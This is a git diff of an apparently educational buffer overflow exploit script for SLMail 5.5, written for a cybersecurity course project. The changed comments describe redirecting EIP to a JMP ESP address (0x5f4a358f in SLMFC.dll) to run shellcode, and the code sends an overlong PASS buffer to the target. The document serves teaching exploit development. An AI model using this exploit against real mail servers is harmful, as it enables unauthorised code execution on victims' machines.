@@ -1,12 +1,12 @@
-# Programming For Cybersecurity course - Project
-# Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
+#  Programming For Cybersecurity course - Project
+#  Subject: Development of a buffer overflow exploit based on a proof of concept exploit.
 #
-# Author: Tomasz
+#  Author: Tomasz / G00398835
 #
-#  Next step requires that we find an instruction to which we could redirect execution flow.
-#  We need an address of return istruction. If we redirect EIP to this address JMP ESP will be executed
-#  which will lead execution flow to our payload. We can use Moda module with Immunity debugger to find address of JMP ESP (opcode is \xff\xe4)
-#  In our case 0x5f4a358f in SLMFC.dll contains a JMP ESP instruction
+#  Next step requires that we find an instruction to which we could redirect execution flow of the victim's machine CPU.
+#  We need an address of a return instruction. If we redirect EIP to this address, for example JMP ESP, we will be able to control what can be executed as the next instruction.
+#  We can use 'Mona' module with Immunity debugger to find address of JMP ESP (the opcode is \xff\xe4).
+#  In our case 0x5f4a358f which is part of SLMFC.dll contains a JMP ESP instruction with weak protections. This is the instruction we are going to use to execute our shellcode.
 # 
 
 import sys
@@ -38,4 +38,4 @@ try:
     s.send('PASS ' + buffer + '\r\n')             # Send Password and buffer
     s.close()
 except:
-    print('There was a problem... please check if the server is vulnerable and SLMail 5.5 is running on the target.')
+    print('There was a problem! Please check your code and if the server is vulnerable and SLMail 5.5 is running on the target.')
